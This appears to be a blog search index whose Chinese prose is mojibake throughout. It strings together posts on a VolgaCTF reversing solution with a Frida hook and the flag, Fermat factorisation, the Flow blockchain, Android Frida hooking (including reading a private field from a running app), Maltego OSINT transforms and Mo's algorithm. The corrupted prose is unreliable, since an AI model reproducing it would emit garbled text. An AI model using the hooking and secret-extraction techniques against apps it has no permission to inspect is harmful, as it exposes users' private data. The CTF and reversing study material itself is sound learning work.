é€™å€‹æ–¹æ³•ä¹Ÿæ˜¯æˆ‘è³½å¾Œçœ‹ åˆ¥äºº ç”¨çš„ï¼Œfrida çœŸçš„æ˜¯å¥½æ±è¥¿ï¼Œä¹‹å‰å‰›å¥½æœ‰ç ”ç©¶ä¸€é» fridaï¼Œç¬¬ä¸€æ¬¡ç”¨åœ¨æ¯”è³½ä¸­ï¼ŒåŸºæœ¬ä¸Šè·Ÿå‰ä¸€å€‹è§£æ³•ä¸€æ¨£å» hook å‡½å¼çš„é–‹é ­å’Œçµå°¾ï¼Œä¸é frida åˆæ›´æ–¹ä¾¿äº†ï¼Œè«‹çœ‹ä¸‹é¢ç¨‹å¼ç¢¼ã€‚ solve-frida.js12345678910111213141516171819202122var base = ptr(Process.enumerateModulesSync()[0].base)var recursive_func_ptr = base.add(0x13b0)var mem = {}Interceptor.attach(recursive_func_ptr, { onEnter: function (args) { this.buf = args[0] this.hash = args[1] + '-' + args[2] + '-' + args[3] if (mem[this.hash] !== undefined) { args[1] = ptr(1) } }, onLeave: function (retval) { if (mem[this.hash] === undefined) { mem[this.hash] = [this.buf.readU64(), this.buf.add(8).readU64(), this.buf.add(16).readU64()] } else { this.buf.writeU64(mem[this.hash][0]) this.buf.add(8).writeU64(mem[this.hash][1]) this.buf.add(16).writeU64(mem[this.hash][2]) } }}) æœ€å¾ŒåŸ·è¡Œ frida --no-pause --runtime=v8 -l solve-frida.js ./f-hash å°±å¯ä»¥äº† Flag 1VolgaCTF{16011432ba16efc8dcf779477985b3b9} https://github.com/OAlienO/CTF/tree/master/2020/VolgaCTF/F-Hash https://pastebin.com/Dj6wteXk https://sectt.github.io/writeups/Volga20/f-hash/README","link":"/2020/05/04/f-hash/"},{"title":"ã€æ¼”ç®—æ³•ç­†è¨˜ã€‘Fermat&#39;s Factorization Method","text":"æœ‰ä¸€å€‹å¥‡åˆæ•¸ $n$ ï¼Œæ˜¯å…©å€‹å¥‡è³ªæ•¸çš„ä¹˜ç© $n = pq$ ä»¤ $a = \\frac{p + q}{2}, b = \\frac{p - q}{2}$ é‚£éº¼ $n = (a + b)(a - b) = a^2 - b^2$ ä½†æ˜¯ä»Šå¤©æˆ‘å€‘ä¸çŸ¥é“ $p, q$ ï¼Œè€Œæˆ‘å€‘æƒ³è¦åˆ†è§£ $n$ é‚£æˆ‘å€‘å°±çŒœ $a = \\lceil \\sqrt{n} \\rceil$ ï¼Œæ¸¬è©¦ $a^2 - n$ æ˜¯ä¸æ˜¯å®Œå…¨å¹³æ–¹æ•¸ çŒœåˆ°çš„è©±å¯ä»¥å¾ $a, b$ åæ¨å› $p, q$ æ²’çŒœåˆ°å°±æŠŠ $a$ åŠ ä¸€ç¹¼çºŒçŒœ ä½¿ç”¨æ¢ä»¶ ç•¶ $|p-q|$ å¾ˆå°ï¼Œå¯ä»¥æœ‰æ•ˆçš„åˆ†è§£åˆæ•¸ $n$ ç¨‹å¼ç¢¼ ( python ) 1234567891011import mathimport gmpy2def fermat(n): a = math.ceil(math.sqrt(n)) b2 = a * a - n while not gmpy2.iroot(b2, 2)[1]: a = a + 1 b2 = a * a - n b = math.sqrt(b2) return [a + b, a - b]","link":"/2018/02/22/fermat/"},{"title":"ã€é …ç›®ä»‹ç´¹ã€‘Flow ( Dapper Labs )","text":"é€™å€‹é …ç›®ç®—æ˜¯å¾ˆæ–°çš„é …ç›®ï¼Œå»å¹´çš„ 9/22 - 10/3 æ‰åœ¨ç¬¬ä¸€æ³¢ ICOï¼Œæ¯äººé™è³¼ 1000 USDCï¼Œç•¶æ™‚ ICO çš„åƒ¹æ ¼æ˜¯ä¸€é¡† FLOW è¦åƒ¹ 0.1 USDCï¼Œåˆ°ç¾åœ¨ä¹Ÿæ¼²äº† 200 å€äº†å§ï¼Œåªæ¨æ²’æœ‰è²·æ›´å¤šå•Š Orz ä¸éè¦é–å€‰ä¸€å¹´ï¼Œæ‰€ä»¥è¦åˆ°ä»Šå¹´åº•æ‰æ‹¿çš„å›ä¾†ï¼Œä½†æ˜¯å…‰æ˜¯ç”¢ç”Ÿçš„åˆ©æ¯å°±å·²ç¶“å›æœ¬å¥½å¹¾å€äº†xD å¥½äº†ï¼Œå»¢è©±ä¸å¤šèªªï¼Œä¸‹é¢ä¾†ä»‹ç´¹ä¸€ä¸‹ flow çš„ç‰¹é»ã€‚ è³‡æº é€™é‚Šå…ˆæ”¾å¹¾å€‹é€£çµï¼Œæœ‰èˆˆè¶£å…¥é–€çš„å¯ä»¥çœ‹ä¸€ä¸‹ å®˜æ–¹å¯«çš„å…¥é–€æ–‡ç«  å®˜æ–¹çš„æ–‡æª” åœ‹å¤–å¤§ä½¬çš„å…¥å‘æŒ‡å— ç‰¹é» Flow æ˜¯å°ˆé–€ç‚ºæ‡‰ç”¨ç¨‹å¼ä»¥åŠéŠæˆ²æ‰€é–‹ç™¼çš„ä¸€æ¢æ–°çš„å€å¡ŠéŠ åœ¨éŠä¸Šé¢å¯ä»¥ç”¨ Cadence é€™å€‹ç¨‹å¼èªè¨€æ’°å¯« smart contractï¼Œå°æ¯”éš”å£æ£šçš„ Ethereum ç”¨ Solidity å¯« smart contract Cadence é€™å€‹ç¨‹å¼èªè¨€æœ‰ä»€éº¼ç‰¹é»å‘¢ Resource-Oriented Programming è½èªªæ˜¯åƒè€ƒ facebook çš„ Libra ç”¨çš„ Move èªè¨€ è·Ÿ Rust çš„ ownership å¾ˆåƒ å¯ä»¥çœ‹çœ‹ä¸‹é¢å…©ç¯‡ papersï¼Œåœ¨è¬›æ€éº¼æ¨£è¨­è¨ˆä¸€å€‹é©åˆç”¨åœ¨ smart contract ä¸Šçš„èªè¨€ Obsidian: A Safer Blockchain Programming Language Resource-Aware Session Types for Digital Contracts Upgradable Smart Contract å¤šäº†ä¸€å€‹ beta state å¯ä»¥è®“ä½ ç›¡æƒ…çš„ upgradeï¼Œåœ¨é€™å€‹éšæ®µï¼Œå¦‚æœä½¿ç”¨é€™è¦ç”¨å°±è¦è‡ªè¡Œæ‰¿æ“”é¢¨éšªå›‰ï¼Œè©±æ˜¯é€™æ¨£èªªçš„ ç­‰åˆ°éƒ½æ¸¬è©¦å®Œå¾Œï¼Œå°±å¯ä»¥æ­£å¼ release äº†ï¼Œä¹‹å¾Œå°±è·Ÿéš”å£æ£š Ethereum çš„ smart contract ä¸€æ¨£å°±ä¸èƒ½å†æ”¹ä»–äº† Built-in Logging Support åªæœƒåœ¨ transaction ä¸Šæ¨™è¨˜ä¸€å€‹è¨˜è™Ÿï¼Œä½ æƒ³è¦çœ‹ log å°±è‡ªå·±åœ¨é›¢ç·šåŸ·è¡Œä¸€æ¬¡å°±å¯ä»¥çœ‹åˆ°äº†ï¼Œä¸åƒéš”å£æ£š Ethereum æŠŠ log å„²å­˜åœ¨éŠä¸Šé¢ åœ¨ Cadence èªè¨€ä¸­å°±ç›´æ¥ log(&quot;hi&quot;) å°±å¯ä»¥å° log äº†ï¼Œä¸åƒéš”å£æ£š Ethereum é‚„è¦å…ˆå®šç¾© event å† emit Flow é€™æ¢å€å¡ŠéŠæœ‰å“ªäº›ç‰¹é»å‘¢ å‚ç›´åˆ†å·¥ ( pipeline )ï¼ŒæŠŠå•é¡Œåˆ‡æˆå››ä»½ï¼ŒæŸç¨®å•é¡Œæœƒæœ‰ä¸€ç¨®å°ˆé–€çš„ç¯€é»è² è²¬è™•ç† ä¸åƒéš”å£æ£š Ethereum å°‹æ±‚ sharding çš„è§£æ±ºæ–¹å¼ï¼Œç”¨å¹³è¡Œåˆ†å·¥æŠŠæ‰€æœ‰äº¤æ˜“åˆ‡æˆå¾ˆå¤šå­éŠï¼Œå¤šäº†å¾ˆå¤šå•é¡Œ åˆ†ä¸‹é¢å››ç¨®å·¥ä½œ Consensus Nodes : å…±è­˜æ©Ÿåˆ¶åœ¨æ­¤ç™¼åŠŸï¼ŒFlow ä½¿ç”¨ HotStuff å…±è­˜æ©Ÿåˆ¶ Verification Nodes : æª¢æŸ¥æ­£ç¢ºæ€§ï¼Œå–ç· é•è¦è€… Execution Nodes : åŸ·è¡Œäº¤æ˜“é™„å¸¶çš„é‚£äº›è¨ˆç®—å·¥ä½œï¼Œä¹Ÿå°±æ˜¯ smart contract è£¡é¢çš„ç¨‹å¼ Collection Nodes : è² è²¬åŒ…è£äº¤æ˜“å€‘è™•ç†äº›é›œäº‹ï¼Œå†ä¸Ÿçµ¦ Consensus Nodesï¼Œç”¨ä¾†ææ˜‡æ•´é«”å€å¡ŠéŠçš„æ•ˆç‡ ç¸½è€Œè¨€ä¹‹ Consensus å’Œ Verification é€™å…©ç¨® Node æ˜¯å®‰å…¨å®ˆé–€å“¡è² è²¬è®“ Flow æ›´å®‰å…¨ Execution å’Œ Collection é€™å…©ç¨® Node æ˜¯ç˜‹ç‹‚æ©Ÿå™¨äººè² è²¬è®“ Flow æ›´æœ‰æ•ˆç‡è·‘å¾—æ›´å¿« æ¯å€‹å¸³è™Ÿè£¡é¢éƒ½å¯ä»¥æœ‰å¤šå€‹ smart contractï¼Œä¸åƒéš”å£æ£š Ethereum çš„ smart contract å’Œ address æ˜¯ä¸€å°ä¸€çš„é—œä¿‚ å…§å»ºæ”¯æ´ multi-signatureï¼Œæ¯å€‹ key æœƒæœ‰ä¸€å€‹ weightï¼Œåªæœ‰ä½ æä¾›çš„ key å€‘çš„ weight åŠ èµ·ä¾†æœ‰ 1000 å°±å¯ä»¥åšäº‹æƒ…äº† è½å®˜ç¶²ä»‹ç´¹æ˜¯èªªæœ‰å¸³è™Ÿæ¢å¾©æ©Ÿåˆ¶ï¼Œä¸æ¸…æ¥šç´°ç¯€ å¼·èª¿èªªä»–éµå®ˆäº†è³‡æ–™åº«ç³»çµ±çš„ ACID ( Atomic, Consistent, Isolated, and Durable ) åŸå‰‡ï¼Œå› ç‚ºæ ¹æœ¬ä¸Šå€å¡ŠéŠå°±æ˜¯ä¸€å€‹å»ä¸­å¿ƒåŒ–çš„è³‡æ–™åº« å¦‚ä½•æˆç‚ºç¯€é» å®˜æ–¹çš„æ–‡æª” - Setting Up a Flow Node NODE TYPE CPU MEMORY DISK Collection 2 cores 16 GB 200 GB Consensus 2 coresv 16 GB 200 GB Execution 16 cores 128 GB 2 TB Verification 2 cores 16 GB 200 GB Access 2 cores 16 GB 200 GB Make sure you have a sufficiently fast connection; we recommend at least 1Gbps, and 5Gbps is better. ç¡¬é«”è¦æ±‚é‚„è¡Œï¼Œæˆ‘çš„æ¡Œæ©Ÿå¥½åƒé‚„èƒ½è·‘ï¼Œä½†æ˜¯é€™å€‹ç¶²é€Ÿè¦æ±‚æœ‰é»é«˜å•Š è€Œä¸”é‚„è¦å¡«è¡¨å–®ç”³è«‹ï¼Œå¤ªä¸­å¿ƒåŒ–äº†å•Š ç„¶å¾Œé€™è£¡æœ‰å¯«æ¯ç¨® node è¦è·‘å¾—è©±è¦ stake å¤šå°‘é¡† flowï¼Œæœ€ä¾¿å®œä¹Ÿè‡³å°‘è¦ stake 135000 é¡† flowï¼Œä»¥ç›®å‰çš„åƒ¹æ ¼ä¾†çœ‹å¤§æ¦‚æ˜¯ 270 è¬ç¾é‡‘å§ï¼Œæˆ‘å» Flow ç›®å‰çš„ä¸€äº›å•é¡Œ ç›®å‰ Flow é‚„åœ¨åˆæœŸéšæ®µï¼Œæœ‰äº›æ±è¥¿é‚„æ²’æå¥½ ä¸‹é¢ä¸€äº›è³‡è¨Šæ˜¯æˆ‘åœ¨ discord ç¾¤çœ‹åˆ°çš„ we still have a lot of things locked down in mainnet right now. The ability to create accounts is one of them. At this time only partnered wallets can create accounts. This will obviously be opened up in the future. At a minimum it wonâ€™t happen until fees are in place on mainnet. qvvg on discord ä¸»ç¶²è·¯é‚„æ²’å¥½å•Šï¼Œä¸èƒ½éš¨æ„å‰µå¸³è™Ÿ éœ€è¦ä»–å€‘åˆä½œçš„å¤¥ä¼´åƒæ˜¯ blockto æ‰èƒ½å‰µï¼Œå¯ä»¥ç”¨ https://port.onflow.org/ é€™å€‹å‰µå¸³è™Ÿçš„æ¨£å­ é‚„ä¸å¤ å»ä¸­å¿ƒåŒ–å•Š Flowâ€™s fee model is still under development, but will have transaction fees. The payer of a transaction can be separate from the authorizer, so dapps can easily pay for their users transactions. Flow keeps tx fees affordable and accessible for all. Flow Assistant Bot on discord æ‰‹çºŒè²»çš„æ©Ÿåˆ¶ä¹Ÿé‚„æ²’å¼„å¥½å•Š Flow is an decentralized protocol being built in an open ecosystem - there is no formal roadmap but if youâ€™d like to see areas people are currently expending effort you can take a look at issues currently in the GitHub repo https://github.com/onflow/flow/issues and feel free to create or comment on issues for anything that you think should exist on Flow. Flow Assistant Bot on discord æ²’æœ‰æ­£å¼çš„ roadmap Flow çš„æ‡‰ç”¨ NBA Top Shot: NBA ä¸»é¡Œçš„ NFTï¼Œå¯ä»¥è®“ä½ æ”¶è—ä½ æœ€æ„›çš„çƒå“¡ï¼Œä»¥åŠä»–å€‘å¾—åˆ†çš„ç‰‡æ®µç­‰ VIV3: è²·è³£ NFT çš„å¹³å° MotoGPâ„¢ Ignition: é¡ä¼¼ Ethereum ä¸Šçš„ F1Â® Delta Timeï¼ŒåŒä¸€æ‰¹é–‹ç™¼äººå“¡çš„æ¨£å­ï¼Œåªæ˜¯å¾ F1 è³½è»Šæ”¹æˆ MotoGP æ‘©æ‰˜è»Šï¼Œå¯ä»¥çµ„è£è‡ªå·±çš„è»Šè»Šç„¶å¾Œè·Ÿåˆ¥äººæ¯”è³½ï¼Œä¸‹å€‹æœˆ 3/26 é–‹è³£ CryptoKitties: é‚„åœ¨è¨ˆç•«å¾ Ethereum é·ç§»åˆ° Flowï¼Œä¸çŸ¥é“æ˜¯å“ªæ™‚å€™ ç¸½çµ Flow æå‡ºäº†å¾ˆå¤šæ–¹æ¡ˆä¾†æ”¹é€²å»ä¸­å¿ƒåŒ–æ‡‰ç”¨é¢è‡¨åˆ°çš„å•é¡Œï¼Œæ¥ä¸‹ä¾†å°±è¦éœå¾…æ™‚é–“çš„è€ƒé©—ï¼Œç­‰æ½®æ°´é€€äº†å°±çŸ¥é“ Flow æœ‰æ²’æœ‰ç©¿è¤²å­äº† Flow to the Moon ğŸš€","link":"/2021/02/27/flow/"},{"title":"ã€å®‰å“é€†å‘ã€‘Frida Hook å‹•æ…‹èª¿è©¦","text":"ä»Šå¤©æˆ‘å€‘è¦ä¾†ç·´ç¿’ç”¨ frida åœ¨ Android ä¸Šåšå‹•æ…‹èª¿è©¦ é€†ä¹‹å‘¼å¸å£¹ä¹‹å‹ - ä¸€èˆ¬å‡½å¼ å…ˆä¾†å¯«å€‹ç°¡å–®çš„ç¯„ä¾‹ APP æœ‰ä¸€å€‹æŒ‰æ‰­å’Œä¸€å€‹è¼¸å…¥æ¬„ï¼Œè¼¸å…¥åå­—ä¹‹å¾Œï¼ŒæŒ‰ä¸‹æŒ‰éˆ•ï¼Œå°±æœƒé¡¯ç¤º Hello åŠ ä¸Šä½ è¼¸å…¥çš„åå­— ä¸æœƒå¯« APP çš„å°æœ‹å‹å¯ä»¥å…ˆå» youtube ä¸Šæ‰¾æ•™å­¸ï¼Œæœ‰ä¸€å¤§å † MainActivity.java1234567891011121314151617181920212223242526272829303132package com.example.myapplication;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button sayButton = findViewById(R.id.sayButton); sayButton.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { EditText somethingEditText = findViewById(R.id.somethingEditText); TextView resultTextView = findViewById(R.id.resultTextView); String something = somethingEditText.getText().toString(); resultTextView.setText(say(something)); } }); } String say (String something) { return &quot;Hello &quot; + something; }} python è² è²¬å‘¼å« frida api åšæ³¨å…¥ï¼Œjavascript æ˜¯è¢«æ³¨å…¥é€²å»åšäº‹çš„ æˆ‘å€‘çš„ç›®æ¨™æ˜¯ hook å‡½å¼ sayï¼Œä¸¦åœ¨åŸæœ¬çš„è¼¸å‡ºæ–‡å­—å¾Œé¢åŠ ä¸Š !!! hook.py1234567891011121314151617import fridadef on_message(message, payload): print(message)device = frida.get_usb_device()pid = device.spawn([&quot;com.example.myapplication&quot;])session = device.attach(pid)with open(&quot;script.js&quot;) as f: script = session.create_script(f.read()) script.on(&quot;message&quot;, on_message) script.load()device.resume(pid)input() script.js1234567Java.perform(() =&gt; { main = Java.use(&quot;com.example.myapplication.MainActivity&quot;) main.say.implementation = function (something) { var ret = this.say(something) return ret + '!!!' }}) é€†ä¹‹å‘¼å¸è²³ä¹‹å‹ - é‡è¼‰å‡½å¼ æ”¹ä¸€ä¸‹ç¯„ä¾‹ APPï¼Œå¤šåŠ ä¸Šä¸€å€‹æ¥å—æ•¸å­—åšè¼¸å…¥çš„ say å‡½å¼ æ¥æ”¶åˆ°æ•¸å­—å¾Œï¼Œå°±è¼¸å‡º Hello åŠ ä¸Šè¼¸å…¥çš„æ•¸å­—çš„å¹³æ–¹ MainActivity.java123456789101112131415161718192021222324252627282930313233343536373839404142package com.example.myapplication;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button sayButton = findViewById(R.id.sayButton); sayButton.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { EditText somethingEditText = findViewById(R.id.somethingEditText); TextView resultTextView = findViewById(R.id.resultTextView); String something = somethingEditText.getText().toString(); try { Integer number = Integer.parseInt(something); resultTextView.setText(say(number)); } catch (NumberFormatException e) { resultTextView.setText(say(something)); } } }); } String say (String something) { return &quot;Hello &quot; + something; } String say (Integer number) { number = number * number; return &quot;Hello &quot; + number.toString(); }} å…©å€‹ say éƒ½æ˜¯ä¸€æ¨£çš„åå­—ï¼Œæ‰€ä»¥ hook çš„æ™‚å€™è¦ç”¨ overload å»å€åˆ†ï¼Œoverload åƒæ•¸æ”¾çš„æ˜¯ç›®æ¨™å‡½å¼è¼¸å…¥åƒæ•¸çš„å‹æ…‹ é€™æ¬¡æˆ‘å€‘åœ¨æ–°çš„ say å‡½å¼çš„è¼¸å‡ºæ–‡å­—å¾Œé¢åŠ ä¸Š ??? hook.py è·Ÿä¸Šä¸€å€‹ä¾‹å­ä¸€æ¨£å°±ä¸å†è²¼ä¸€æ¬¡äº† script.js1234567891011Java.perform(() =&gt; { main = Java.use(&quot;com.example.myapplication.MainActivity&quot;) main.say.overload(&quot;java.lang.String&quot;).implementation = function (something) { var ret = this.say(something) return ret + '!!!' } main.say.overload(&quot;java.lang.Integer&quot;).implementation = function (number) { var ret = this.say(number) return ret + '???' }}) é€†ä¹‹å‘¼å¸åƒä¹‹å‹ - éš±è—å‡½å¼ å†æ”¹ä¸€ä¸‹ç¯„ä¾‹ APPï¼Œå¤šåŠ ä¸Šä¸€å€‹è®Šæ•¸ secret å’Œä¸€å€‹å‡½å¼ getSecretï¼Œåœ¨ onCreate è£¡é¢æœƒçµ¦ secret ä¸€å€‹éš¨æ©Ÿå€¼ï¼Œæˆ‘å€‘çš„ç›®æ¨™å°±æ˜¯æ‰¾å‡ºé€™å€‹å€¼ MainActivity.java12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package com.example.myapplication;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends AppCompatActivity { private int secret; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); secret = (int) (Math.random() * 100); Button sayButton = findViewById(R.id.sayButton); sayButton.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { EditText somethingEditText = findViewById(R.id.somethingEditText); TextView resultTextView = findViewById(R.id.resultTextView); String something = somethingEditText.getText().toString(); try { Integer number = Integer.parseInt(something); resultTextView.setText(say(number)); } catch (NumberFormatException e) { resultTextView.setText(say(something)); } } }); } String say (String something) { return &quot;Hello &quot; + something; } String say (Integer number) { number = number * number; return &quot;Hello &quot; + number.toString(); } int getSecret () { return secret; }} å› ç‚ºæˆ‘å€‘çš„ç›®æ¨™ä¸æ˜¯è‡ªå·± new ä¸€å€‹ç‰©ä»¶å‡ºä¾†æŠ“ secretï¼Œé€™æ¨£å°±åªæ˜¯ä¸€å€‹æˆ‘å€‘è‡ªå·±å°±å¯ä»¥ç”Ÿæˆçš„éš¨æ©Ÿå€¼è€Œå·² æˆ‘å€‘æ˜¯è¦æ‰¾å‡ºç›®å‰å·²ç¶“å­˜åœ¨çš„é‚£å€‹ instance çš„ secretï¼Œåœ¨å¯¦éš›ä¾‹å­ä¸­å¯èƒ½å°±æœƒæ˜¯ä¸€çµ„éš¨æ©Ÿç”Ÿæˆçš„å¯†ç¢¼ä¹‹é¡çš„ æ‰€ä»¥æˆ‘å€‘è¦ç”¨åˆ° Java.choose å»æŠ“ instanceï¼ŒæŠ“åˆ° instance å¾Œï¼Œå¯ä»¥ instance.getSecret() å‘¼å«å‡½å¼æå®š instance.secret.value å­˜å–è®Šæ•¸æå®š ç„¶å¾Œç”¨ send å¯ä»¥æŠŠè³‡æ–™å‚³åˆ° python ç«¯çš„ on_message åšè™•ç† script.js123456789Java.perform(function () { Java.choose(&quot;com.example.myapplication.MainActivity&quot;, { onMatch: function (instance) { send(instance.getSecret()) // call function send(instance.secret.value) // access vairable }, onComplete: function () {} })}) ç–‘é›£é›œç—‡ Q : æœ‰å‡½å¼ a è·Ÿè®Šæ•¸ a åŒåæ€éº¼è¾¦ ? A : a å­˜å–å‡½å¼ï¼Œ_a å­˜å–è®Šæ•¸ https://github.com/hookmaster/frida-all-in-one How to access class member variable if thereâ€™s a member function called the same name?","link":"/2020/02/16/frida/"},{"title":"ã€å·¥å…·ä»‹ç´¹ã€‘Maltego","text":"Maltego æ˜¯ç”¨ä¾†è‡ªå‹•åŒ–æƒ…è³‡è’é›†çš„å·¥å…·ã€‚ åŸºæœ¬ä»‹ç´¹ ä¸€é–‹å§‹å°±æŒ‰ Creat a new graph æ–°å¢ä¸€å€‹å·¥ä½œçš„åœ–å±¤ï¼Œå°±å¯ä»¥åœ¨ä¸Šé¢ç•«å‡ºé—œä¿‚åœ–ã€‚ Entities æ˜¯åŸºæœ¬ç‰©ä»¶ï¼Œæœ‰å¾ˆå¤šç¨®é¡å‹æ¯”å¦‚ Company, Organization, Domain, Website, â€¦ï¼Œæ¯å€‹ç‰©ä»¶éƒ½æœ‰å¹¾å€‹å±¬æ€§æ¬„ä½ï¼Œå‡è¨­ä½ æ‹¿åˆ°æŸå€‹äººçš„æ‰‹æ©Ÿè™Ÿç¢¼ï¼Œé‚£å¯ä»¥å¾æ—é‚Š Entity Palette æ‹–æ›³ä¸€å€‹ Phone Number åˆ°å³é‚Šç©ºç™½è™•ã€‚ Transforms å°±æ˜¯ä¸€å€‹å¯ä»¥é‡è¤‡ä½¿ç”¨çš„å‡½å¼ï¼Œæ¯”å¦‚å·²ç¶“æœ‰äº†æ‰‹æ©Ÿè™Ÿç¢¼ï¼Œé‚£å°±å»æŸå€‹ç¶²ç«™ä¸Šçˆ¬æ‰‹æ©Ÿè™Ÿç¢¼å°æ‡‰çš„åœ‹å®¶ä¹‹é¡çš„ï¼ŒæŠŠé€™å€‹çˆ¬çš„æ­¥é©Ÿå¯«æˆä¸€å€‹ transformï¼Œå°±å¯ä»¥è‡ªå‹•åŒ–å»å¾å·²çŸ¥çš„è³‡æ–™ç”Ÿæ›´å¤šç›¸é—œçš„è³‡æ–™ã€‚Local Transform æ˜¯è‡ªå·±å¯«çš„å‡½å¼ï¼Œä¹Ÿæœ‰åˆ¥äººå¯«å¥½çš„åœ¨ Transform Hub ä¸Šé¢ã€‚ Local Transforms è·Ÿè‘—å®˜æ–¹æ–‡ä»¶ maltego docs åšå°±å¯ä»¥å¤§æ¦‚äº†è§£æ€éº¼ç”¨ python å»å¯« Local Transforms äº†ã€‚ 12pip install maltego-trxmaltego-trx start new_project å…ˆå®‰è£ python å¥—ä»¶ï¼Œå†ç”¨ maltego-trx å»åˆå§‹åŒ–ä¸€å€‹ project transforms/TaxIDToCompany.py123456789101112import jsonimport requestsfrom maltego_trx.entities import Personfrom maltego_trx.transform import DiscoverableTransformclass TaxIDToCompany(DiscoverableTransform): @classmethod def create_entities(cls, request, response): taxid = request.Properties['properties.taxid'] r = requests.get(f'http://company.g0v.ronny.tw/api/show/{taxid}') result = json.loads(r.text) response.addEntity('maltego.Company', result['data']['å…¬å¸åç¨±']) ä¸»è¦å°±æ˜¯ç¹¼æ‰¿ DiscoverableTransform ç„¶å¾Œå¡«å¯« create_entities é€™å€‹å‡½å¼ï¼Œrequest è£¡é¢å°±æœ‰åŸ·è¡Œ transform çš„é‚£å€‹ entity çš„è³‡è¨Šï¼Œç„¶å¾Œé€™è£¡æ˜¯ç”¨çµ±ä¸€ç·¨è™Ÿ ( TaxID ) å»æ‰¾å…¬å¸åç¨±ï¼Œç„¶å¾Œæ–°å¢ä¸€å€‹å…¬å¸çš„ Entityã€‚ åŸæœ¬æ²’æœ‰ TaxID é€™å€‹ Entity è¦å…ˆå» New Entity Type æ–°å¢ä¸€å€‹ TaxIDã€‚ company.g0v.ronny.tw å›å‚³çš„è³‡è¨Šæœ‰å¾ˆå¤šï¼Œå¯ä»¥æŠŠé‚£äº›è³‡è¨Šéƒ½åŠ é€²ä¾†ï¼Œå¯æ˜¯æˆ‘å°±æ‡¶ã€‚ å¯«å®Œä¹‹å¾Œè¦æŠŠ Local Transform åŠ é€²å»ï¼Œæœ‰å¹¾å€‹æ¬„ä½è¦æ³¨æ„ï¼Œ Input entity type : è¦å¡«é€™å€‹ transform è¦å°å“ªä¸€ç¨® entity åšæ“ä½œ Command : æˆ‘å€‘æ˜¯ç”¨ python api æ‰€ä»¥è¦å¡« python çš„ PATHï¼Œåœ¨ linux ä¸Šå¯ä»¥ç”¨ which python æ‰¾ Parameters : å¡« project.py local TaxIDToCompanyï¼Œproject.py æ˜¯åˆå§‹åŒ– project å®Œæœƒç”¢ç”Ÿçš„è…³æœ¬ï¼Œlocal æŒ‡çš„å°±æ˜¯ Local Transformï¼ŒTaxIDToCompany æ˜¯ä½  transform çš„åå­—ï¼Œå°±æ˜¯é‚£å€‹æª”åçš„éƒ¨åˆ†å§ Working directory: Project çš„è·¯å¾‘ï¼Œå°±æ˜¯è¦æœ‰ project.py çš„é‚£å€‹åœ°æ–¹ æœ€å¾ŒæŒ‰ä¸‹ Run è·‘å®Œ transform ä¹‹å¾Œï¼Œå°±æœƒè‡ªå‹•æ–°å¢ä¸€å€‹ Company çš„ Entityã€‚","link":"/2020/07/31/maltego/"},{"title":"ã€æ¼”ç®—æ³•ç­†è¨˜ã€‘è«éšŠç®—æ³•","text":"å•é¡Œæ•˜è¿° çµ¦ä¸€å¤§å° $N$ çš„åºåˆ—ï¼Œå›ç­” $M$ æ¬¡æŸ¥è©¢ï¼Œæ¯æ¬¡æŸ¥è©¢éƒ½æ˜¯å•ä¸€å€‹å€é–“ $[L, R]$ çš„ç­”æ¡ˆï¼ˆæ¯”å¦‚å€é–“çœ¾æ•¸ï¼‰ ä½¿ç”¨æ¢ä»¶ å¯ä»¥åœ¨å¾ˆçŸ­çš„æ™‚é–“å…§ç”± $[L, R]$ å¾—åˆ° $[L, R + 1], [L - 1, R], [L, R - 1], [L + 1, R]$ çš„ç­”æ¡ˆ å¯ä»¥é›¢ç·šé‹ç®—ï¼ˆä¹Ÿå°±æ˜¯å¯ä»¥æŠŠè¼¸å…¥é€šé€šåƒé€²ä¾†å†è¼¸å‡ºï¼‰ ç®—æ³• å°‡ $M$ æ¬¡æŸ¥è©¢æ ¹æ“š $L$ çš„å¤§å°åˆ†ç‚º $\\sqrt{N}$ å¡Š ä¹Ÿå°±æ˜¯æ¯å¡Šè£¡é¢çš„ $L$ æœ€å¤šåªæœƒå·®è· $\\sqrt{N}$ æ¯å¡Šè£¡é¢çš„ $R$ å†ç”±å°åˆ°å¤§æ’åº æŒ‰ç…§æ’å¥½çš„é †åºç®—ç­”æ¡ˆï¼Œç¼ºå°‘ä»€éº¼å°±ä¸€å€‹å€‹åŠ é€²ä¾†ï¼Œå¤šäº†ä»€éº¼å°±ä¸€å€‹å€‹ä¸Ÿæ‰ add å‡½å¼å°±æ˜¯å¯¦ä½œæŠŠä¸€å€‹æ•¸åŠ é€²ç›®å‰çš„å€é–“ sub å‡½å¼å°±æ˜¯å¯¦ä½œæŠŠä¸€å€‹æ•¸å¾ç›®å‰çš„å€é–“ä¸Ÿæ‰ 123456struct Q { int l, r, b, i; bool operator &lt; (const Q &amp;q) { return b == q.b ? (r &lt; q.r) : b &lt; q.b; }} q[MAXM]; 1234567891011int block = ceil(sqrt(MAXN));for (int i = 0; i &lt; m; i++) { int l, r; cin &gt;&gt; l &gt;&gt; r; q[i].l = l; q[i].r = r; q[i].b = q[i].l / block; q[i].i = i;}sort(q, q + m); 1234567for (int i = 0, L = 0, R = -1; i &lt; m; i++) { while (R &lt; q[i].r) add(a[++R]); while (q[i].l &lt; L) add(a[--L]); while (q[i].r &lt; R) sub(a[R--]); while (L &lt; q[i].l) sub(a[L++]); ans[q[i].i] = cur;} æ™‚é–“è¤‡é›œåº¦ $O(N^{1.5})$ å¥‡å¶å„ªåŒ– ç¬¬ä¸€å¡Šçš„ $R$ å¾å°åˆ°å¤§ ç¬¬äºŒå¡Šå¾ $R$ å¤§åˆ°å° 